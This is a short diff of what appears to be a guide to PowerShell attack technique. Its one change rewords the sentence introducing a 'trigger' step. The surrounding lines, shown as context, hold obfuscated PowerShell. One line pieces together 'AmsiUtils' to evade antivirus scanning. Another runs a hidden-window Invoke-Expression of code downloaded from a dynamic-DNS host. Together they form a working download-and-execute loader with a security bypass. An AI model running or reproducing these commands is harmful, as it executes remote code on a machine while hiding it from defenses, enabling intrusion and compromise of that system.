@@ -39,7 +39,7 @@ $n = (new-object net.webClient);$am='Amsi'+'U'+'til'+'s';iex ($n).DownloadString
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
-Finally we just need to do a Invoke-Expression of the trigger:
+Finally we will need to "Invoke-Expression" the trigger:
 --------------------------------------------------------------
 powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/trigger.ps1')
 
